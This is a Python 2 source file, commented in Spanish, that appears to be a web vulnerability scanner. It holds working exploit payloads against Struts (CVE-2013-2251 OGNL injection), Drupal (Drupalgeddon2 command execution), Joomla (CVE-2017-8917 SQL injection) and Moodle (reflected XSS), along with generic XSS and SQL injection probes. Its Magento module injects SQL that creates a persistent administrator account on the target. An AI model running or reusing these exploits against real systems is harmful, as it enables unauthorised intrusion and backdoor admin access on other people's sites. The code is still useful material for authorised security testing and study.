#!/usr/bin/env python2
import base64
import requests
import subprocess
import re
from subprocess import check_output
from utils import parseurls
try: from colorama import init, Fore,Back, Style
except: pass

"""
El objeto req tiene metodos para realizar peticiones http
Se encuentra definido en request/rutils
El metodo que verifica la vulnerabilidad es launchExploitsF 
cada modulo debe definir su comportamiento en este metodo
"""
class vulndetector(object):
	def __init__(self,req=None,color=False):
		try:
			init(convert=True,autoreset=True) # colorama
		except:
			pass
		self.color = False
		self.name = 'vulndetector'
		# Elementos para explotar
		self.headers = []
		self.filelist = []
		self.wordpatterns = []
		# holder cms root
		self.cmsroot = None
		# flags to search in external tool output
		self.toolflags = []
		# Objeto para realizar las peticiones
		self.req = req
		self.toolpath = None
		self.defaultdirs = []
		self.defaultfiles = []
		self.dicdefdirs = {}
		self.detections = []
		self.toolargs = []
		# elementos pasados como llamadas del modulo postcrawling
		self.resources = []
		# bandera para ejecucion individual (por cada recurso)
		self.standalone = False
		# Salida de la herramienta externa
		self.output = None
		# Puntuacion del detector
		self.puntuation = 0	
		self.cmsroot = None
	
	#working
	def getName(self): return self.name
	
	# Busca por la carga del header h:key busca key
	def fromHeaders(self,rheaders,direccion):
		rhead,rhkeys = rheaders,rheaders.keys()
		for lheader in self.headers:
			for rhkey in rhkeys:
				if lheader in rhead[rhkey]:
					# aqui lo agrego a la lista
					if self.color:
						try:
							print (Fore.GREEN+'Sw found (Header detection) >>>>>>>> '+Fore.RED+self.name+Style.RESET_ALL)
						except:
							print 'Sw found (Header detection) >>>>>>>> ',self.name
					else:
						print 'Sw found (Header detection) >>>>>>>> ',self.name
					if direccion not in self.detections:
						self.detections.append(direccion)
						self.puntuation+=.1
					return True
		return False
	
	# Busca las cadenas (regexp) de wordpatterns en el codigo html
	def fromCode(self,rcode,direccion):
		for wp in self.wordpatterns:
			matches = re.findall(wp,rcode,re.IGNORECASE) 
			if len(matches) > 0:
				if self.color:
					try:
						print (Fore.GREEN+'Sw found (Code detection) >>>>>>>> '+Fore.RED+self.name+Style.RESET_ALL)
					except:
						print 'Sw found (Code detection) -> ',self.name
				else:
					print 'Sw found (Code detection) -> ',self.name
				for m in matches:
					if m not in self.detections:
						temp = direccion
						self.detections.append(temp)
						self.puntuation+=.1
				return True
		return False
	
	# Detecta mediante la url (nombre del archivo)
	def fromFilename(self,filename):
		if self.standalone:
			print 'Running exploit from filename module ',self.name
			self.launchExploitFilename(filename)
	
	"""
	El metodo que checa las vulnerabilidades se llama despues de que
	se le asignan los recursos a este modulo en vulncontroller@setResources
	"""
	def launchExploitsF(self):
		if len(self.resources) > 0:
			for res in self.resources:
				print 'res %s' % res
		
	def hasDetections(self):
		if len(self.detections) > 0:
			return True
		return False
	
	def getResults(self):
		if self.hasDetections():
			return self.detections
			
	# Agrega recursos a analizar por los modulos de deteccion
	def setResources(self,reslist,cmsroot=None):
		#print 'Soy %s y recibi resources %s' % (self.name,reslist)
		self.resources = reslist
		if cmsroot is not None:
			self.cmsroot = cmsroot
		
	def launchExploitFilename(self,filename):
		print 'exploit template'
		
	def checkvulnerability(self,reqobj):
		print 'vuln check template'
		
	def getPuntuation(self):
		return self.puntuation
		
	#working
	def __str__(self):
		return "\nName %s\nStandalone %s" % (self.name,self.standalone)

	"""
	# inicializa el diccionario con los directorios default del cms
	# def initDicDefDirs(self): pass
	# returns not default cms directories
	# def postCrawling(self): pass				
	# Regresa el resultado de la herramienta externa
	# def getExternalResults(self): return None
	def setToolPath(self,toolpath):pass
	def setToolArgs(self,toolargs):pass
	def setToolFlags(self,toolflags): pass
	#def launchTool(self): pass
	# def extToolScore(self): pass
	"""
	
# done
class strutscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'struts'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.standalone = True
		self.toolpath = None
		self.postcrawl = True
		self.detections = []
		self.resources = []
		self.toolargs = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = True
		self.cmsroot = None

	def launchExploitFilename(self,dirurl):
		if self.launchExploitCVE_2013_2251(dirurl):
			cve = 'CVE2013-2251'
			print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
			#print "VULNERABLE TO CVE2013-2251: ",dirurl
		
	def launchExploitCVE_2013_2251(self,dirurl):
		cve = 'cve-2013-2251'
		#?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%22truerandom%22%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
		payload = ("?%72%65%64%69%72%65%63%74%3a%24%7b%23%72%65%71%3d"
		"%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70"
		"%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69"
		"%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74"
		"%52%65%71%75%65%73%74%27%29%2c%23%61%3d%23%72%65%71%2e%67%65"
		"%74%53%65%73%73%69%6f%6e%28%29%2c%23%62%3d%23%61%2e%67%65%74"
		"%53%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%28%29%2c%23%63%3d"
		"%23%62%2e%67%65%74%52%65%61%6c%50%61%74%68%28%22%2f%22%29%2c"
		"%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27"
		"%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f"
		"%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53"
		"%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61"
		"%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74"
		"%6c%6e%28%22%74%72%75%65%72%61%6e%64%6f%6d%22%2e%74%6f%55%70"
		"%70%65%72%43%61%73%65%28%29%29%2c%23%6d%61%74%74%2e%67%65%74"
		"%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61"
		"%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d"
		)
		tocheck = 'TRUERANDOM'
		fullurl = dirurl+payload
		#print 'testing %s' % fullurl
		response = self.req.getHTMLCode(fullurl)
		try:
			if tocheck in response.text:
				#self.detections.append("[ "+fullurl+" ] ====== "+cve)
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =====")
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False
			
class drupalscan(vulndetector):
	def __init__(self,req,color=False):
		#print 'Entre a drupalscan vuln'
		self.name = 'drupal'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		#Aqui debo probar para cada recurso encontrado alguna vulne asociada
		# resources to test on
		#print 'debug: entre a launch exploitF'
		#print 'cmsroot ',self.cmsroot
		if self.cmsroot is not None:
			#print 'probando xmlrpc en %s cmsroot es %s' % (self.name,self.cmsroot)
			self.launchXMLRPC()
			self.launchDrupalgeddon2()
		
	def launchXMLRPC(self):
		cve = 'xmlrpc'
		dirurl = self.cmsroot+'xmlrpc.php'
		#print 'debug dirurl',dirurl
		#print 'trying xmlrpc'
		#print ' dirurl ',dirurl
		response = self.req.getHTMLCode(dirurl)
		tocheck = 'XML-RPC'
		try:
			if response is not None and tocheck in response.text:
				print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
				self.detections.append("[ "+dirurl+" ] ====== VULNERABLE TO: "+cve+" ========")
				return True
			return False
		except Exception as e:
			return False

	def launchDrupalgeddon2(self):
		if self.cmsroot is None: return False
		cve = 'drupalgeddon2'
		tocheck = 'truerandom'
		dirurl = self.cmsroot
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'echo truerandom', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		# s es el objeto session de el objeto req
		try:
			response = self.req.s.post(self.cmsroot, data=post_params, params=get_params,timeout=4,verify=False)
			if response is not None and tocheck in response.text:
				#print response.text
				self.detections.append("[ "+dirurl+" ] ====== VULNERABLE TO: "+cve+" ======\n")
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				return True
			return False
		except Exception as e:
			print e
			return False
			
class wordpresscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'wordpress'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.launchXMLRPC()
			self.SimpleSocialButtons()
	def launchXMLRPC(self):
		#print 'WORDPRESS VULN trying xmlrpc'
		cve = 'xmlrpc methods exposed'
		datos = """
		<?xml version="1.0"?>
		<methodCall><methodName>system.listMethods</methodName>
			<params><param></param></params>
		</methodCall>
		"""
		fullurl = self.cmsroot+'xmlrpc.php'
		#print "fullurl ",fullurl
		try:
			response = self.req.s.post(fullurl,data=datos)
		except Exception as e:
			print e
			return False
		tocheck = '<string>system.multicall</string>'
		try:
			if tocheck in response.text:
				#print 'es vulnerable ',fullurl
				
				#print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				print response.text
				self.detections.append("[ "+fullurl+" ] ====== Possible VULNERABLE TO: "+cve+" ===========" + response.text)
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False

	def SimpleSocialButtons(self):
			#print 'WORDPRESS VULN trying xmlrpc'
			cve = 'Simple Social Buttons'
			fullurl = self.cmsroot+'/wp-content/plugins/simple-social-buttons/readme.txt'
			#print "fullurl ",fullurl
			try:
				response = self.req.s.get(fullurl)
			except Exception as e:
				print e
				return False
			tocheck = 'Simple Social Media Share Buttons'
			try:
				if tocheck in response.text:
					#print 'es vulnerable ',fullurl
					
					#print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
					print '*'*(len(cve)+15),'\nPossible vulnerable to %s\n' % cve,'*'*(len(cve)+15)
					print response.text
					self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" ===========")
					return True
				return False
			except Exception as e:
				print 'excepcion cachada '+str(e)
				return False
			
class joomlascan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'joomla'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.launchCVE_2017_8917()
		
	def launchCVE_2017_8917(self):
		#print 'DRUPAL VULN trying xmlrpc'
		cve = 'Joomla com_fields SQL Injection (CVE-2017-8917)'
		fullurl = self.cmsroot+'/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,truerandomtruerandom),1)'
		#print "fullurl ",fullurl
		response = self.req.getHTMLCode(fullurl)
		tocheck = 'truerandomtruerandom'
		try:
			if tocheck in response.text:
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				res = ''
				try:
					m = re.search('Unknown column .*',response.text)
					if m: res = m.group(0)
				except Exception as e:
					pass
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =========="+res)
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False

class moodlescan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'moodle'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.launchXSS_PHPCOVERAGE()
		
	def launchXSS_PHPCOVERAGE(self):
		#print 'DRUPAL VULN trying xmlrpc'
		cve = 'PHPCOVERAGE_HOME Cross Site Scripting'
		fullurl = self.cmsroot+'/lib/spikephpcoverage/src/phpcoverage.remote.top.inc.php?PHPCOVERAGE_HOME=%3Cscript%3Ealert(%22truerandom%22)%3C/script%3E'
		#print "fullurl ",fullurl
		response = self.req.getHTMLCode(fullurl)
		tocheck = '<script>alert("truerandom")</script>'
		try:
			if tocheck in response.text:
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =====")
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False
			
class magentoscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'magento'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.accountCreation()
			
	def accountCreation(self):
		print 'accountCreation'
		SQLQUERY="""
		SET @SALT = 'rp';
		SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
		SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
		INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
		INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
		"""
		# Put the nice readable queries into one line,
		# and insert the username:password combinination
		query = SQLQUERY.replace("\n", "").format(username="truerandom", password="truerandomtruerandom")
		pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
		cve = 'Admin Account creation'
		fullurl = self.cmsroot+'index.php/admin/Cms_Wysiwyg/directive/index/'
		#print "fullurl ",fullurl
		r = self.req.s.post(fullurl,data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ","filter": base64.b64encode(pfilter),"forwarded": 1})
		try:
			if r.ok:
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve + "  ==== Login as admin with truerandom:truerandomtruerandom")
				return True
			return False
		except Exception as e:
			print 'exception '+str(e)
			return False
			
class xssscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'xssscan'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = True
		self.cmsroot = None
		
	def launchExploitFilename(self,dirurl):
		if self.testXSS(dirurl):
			print "VULNERABLE TO XSS: ",dirurl
	
	def testXSS(self,dirurl):
		cve = 'XSSVULN'	
		payload = ("")
		tocheck = '<script>alert(/TRUERANDOM/)</script>'
		injection_points= parseurls.get_injection_points(dirurl)
		if injection_points is None: return
		for injection_point in injection_points:
			full_url = injection_point.replace('{TO_REPLACE}',tocheck)
			try:
				res = self.req.getHTMLCode(full_url)
			except Exception as e:
				pass
			if res is not None and res.text is not None:
				if tocheck in res.text:
					print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
					toappend = "[ "+injection_point+" ] ====== VULNERABLE TO: "+cve+" ====="
					if toappend not in self.detections:
						self.detections.append(toappend)
						print('full_url es: %s' % full_url)
						return True
		return False					
					
class sqliscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'sqliscan'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = True
		self.cmsroot = None
		self.pat = re.compile('ERROR|MYSQL|SYNTAX',re.IGNORECASE)
		
	def launchExploitFilename(self,dirurl):
		if self.testSQLi(dirurl):
			print "VULNERABLE TO SQLi: ",dirurl
		
	def testSQLi(self,dirurl):
		self.error_based_sqli(dirurl)
		self.blind_sqli(dirurl)
		
	def error_based_sqli(self,dirurl):
		cve = 'SQLi (Error Based)'
		payload = "'"
		injection_points = parseurls.get_injection_points(dirurl)
		if injection_points is None: return 
		orig_url = dirurl
		# TODO: add pgsql|mssql... keywords
		sql_keywords = ["error","mysql","syntax","manual","server"]
		sql_payloads = ["1","1'","a'","a'-"]
		for injection_point in injection_points:
			for sql_p in sql_payloads:
				mod_url = injection_point.replace("{TO_REPLACE}",sql_p)
				words_not_in_orig_req = self.req.word_not_in_response(sql_keywords,orig_url)
				words_not_in_mod_req = self.req.word_not_in_response(sql_keywords,mod_url)
				if words_not_in_orig_req != words_not_in_mod_req:
					print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
					toappend = "[ "+injection_point+" ] ====== VULNERABLE TO: "+cve+" ====="
					if toappend not in self.detections:
						self.detections.append(toappend)
					return True
		return False	
		
	def blind_sqli(self,dirurl):
		cve = 'SQLi (Blind Based)'
		payload = "'"
		injection_points = parseurls.get_injection_points(dirurl)
		if injection_points is None: return 
		# true_cases,false_cases = [(AND TRUE,AND FALSO)]
		# if resp[orig_url] == resp[true_cases and resp[orig_url] != resp[false_case]
		blind_cases  = [
			("1","1 AND 2=2","1 AND 2=3"),
			("1","1 AND 2>1","1 AND 2>3"),
			("1","1 AND 2=2 -- -v","1 AND 2=3 -- -v"),
			("1","1 AND 2>1 -- -v","1 AND 2>3 -- -v"),
			("a","a' AND '1'='1","a' AND '1'='2"),
			("a","a' AND '2'='2","a' AND '2'='3"),
			("a","a' AND '2'='2' -- -v","a' AND '2'='3' -- -v"),
			("a","a' AND '2'>'1' -- -v","a' AND '2'>'3' -- -v")
		]
		for injection_point in injection_points:
			for sql_p in blind_cases:
				base_case,true_case,false_case = sql_p
				
				base_url = injection_point.replace("{TO_REPLACE}",base_case)
				true_url = injection_point.replace("{TO_REPLACE}",true_case)
				false_url = injection_point.replace("{TO_REPLACE}",false_case)
				try:
					base_r = self.req.getHTMLCode(base_url)
					true_r = self.req.getHTMLCode(true_url)
					false_r = self.req.getHTMLCode(false_url)
				except Exception as e: pass
				
				if (true_r is not None and true_r.text is not None and
					false_r is not None and false_r.text is not None and
					base_r is not None and base_r.text is not None):
					if true_r.text == base_r.text and true_r.text != false_r.text:
						print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
						toappend = "[ "+injection_point+" ] ====== VULNERABLE TO: "+cve+" ====="
						if toappend not in self.detections:
							self.detections.append(toappend)
					return True
		return False	
	
